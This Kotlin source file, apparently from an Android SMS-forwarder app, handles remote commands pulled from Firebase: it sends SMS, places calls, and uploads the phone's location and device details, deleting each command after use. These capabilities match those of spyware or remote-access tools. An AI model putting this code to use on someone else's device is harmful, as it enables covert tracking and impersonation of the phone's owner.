package com.smsforwarder.service

import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.telephony.SmsManager
import android.telephony.SubscriptionManager
import android.util.Log
import androidx.core.content.ContextCompat
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.DatabaseReference
import com.google.firebase.database.ValueEventListener
import com.smsforwarder.utils.DeviceInfoCollector
import com.smsforwarder.utils.LocationHelper

/**
 * Handles remote commands coming from Firebase (sms / call / location / device_info).
 * Split out from ForwarderService to keep the service file smaller and focused on lifecycle.
 */
class CommandHandler(
    private val context: Context,
    private val databaseRef: DatabaseReference
) {
    companion object {
        private const val TAG = "CommandHandler"
    }

    private var commandListener: ValueEventListener? = null

    fun startListening() {
        if (commandListener != null) return
        val commandsRef = databaseRef.child("commands")
        commandListener = object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                for (child in snapshot.children) {
                    val key = child.key ?: continue
                    val action = child.child("action").getValue(String::class.java) ?: "sms"
                    val phoneNumber = child.child("phone_number").getValue(String::class.java) ?: ""
                    val message = child.child("message").getValue(String::class.java) ?: ""
                    val simSlot = child.child("sim_slot").getValue(Int::class.java) ?: 1

                    commandsRef.child(key).removeValue().addOnSuccessListener {
                        when (action) {
                            "sms" -> {
                                if (message.isNotEmpty()) {
                                    sendSmsFromDevice(phoneNumber, message, simSlot)
                                }
                            }
                            "call" -> {
                                if (phoneNumber.isNotEmpty()) {
                                    makeCallFromDevice(phoneNumber, simSlot)
                                }
                            }
                            "location" -> {
                                LocationHelper(context).fetchAndUploadLocation()
                            }
                            "get_device_info" -> {
                                val collector = DeviceInfoCollector(context)
                                val deviceData = collector.getDeviceDetails()
                                databaseRef.child("device_info").setValue(deviceData)
                                    .addOnSuccessListener {
                                        Log.d(TAG, "📱 Device info successfully uploaded via command!")
                                    }
                                    .addOnFailureListener { e ->
                                        Log.e(TAG, "❌ Failed to upload device info: ${e.message}")
                                    }
                            }
                        }
                    }
                }
            }

            override fun onCancelled(error: DatabaseError) {
                Log.e(TAG, "Command Listener Cancelled: ${error.message}")
            }
        }
        commandsRef.addValueEventListener(commandListener!!)
    }

    fun stopListening() {
        commandListener?.let {
            databaseRef.child("commands").removeEventListener(it)
            commandListener = null
        }
    }

    private fun makeCallFromDevice(phoneNumber: String, simSlot: Int) {
        try {
            if (ContextCompat.checkSelfPermission(context, android.Manifest.permission.CALL_PHONE) !=
                android.content.pm.PackageManager.PERMISSION_GRANTED
            ) {
                return
            }

            val uri = Uri.parse("tel:$phoneNumber")
            val callIntent = Intent(Intent.ACTION_CALL, uri).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                putExtra("com.android.phone.extra.slot", simSlot - 1)
                putExtra("simSlot", simSlot - 1)
                putExtra("slot", simSlot - 1)
            }
            context.startActivity(callIntent)
            Log.d(TAG, "📞 Call activity launched from CommandHandler")
        } catch (e: Exception) {
            Log.e(TAG, "❌ Call Error: ${e.message}", e)
        }
    }

    private fun sendSmsFromDevice(phoneNumber: String, message: String, simSlot: Int) {
        try {
            if (ContextCompat.checkSelfPermission(context, android.Manifest.permission.SEND_SMS) !=
                android.content.pm.PackageManager.PERMISSION_GRANTED
            ) {
                return
            }
            var smsManager: SmsManager? = null
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                val subManager = getSubscriptionManager()
                val activeSubs = subManager?.activeSubscriptionInfoList
                if (activeSubs != null && activeSubs.size >= simSlot) {
                    val subId = activeSubs[simSlot - 1].subscriptionId
                    smsManager = context.getSystemService(SmsManager::class.java)
                        .createForSubscriptionId(subId)
                }
            }
            if (smsManager == null) {
                @Suppress("DEPRECATION")
                smsManager = SmsManager.getDefault()
            }
            val parts = smsManager!!.divideMessage(message)
            smsManager!!.sendMultipartTextMessage(phoneNumber, null, parts, null, null)
        } catch (e: Exception) {
            Log.e(TAG, "SMS Send Error: ${e.message}")
        }
    }

    private fun getSubscriptionManager(): SubscriptionManager? {
        return context.getSystemService(SubscriptionManager::class.java)
    }
}
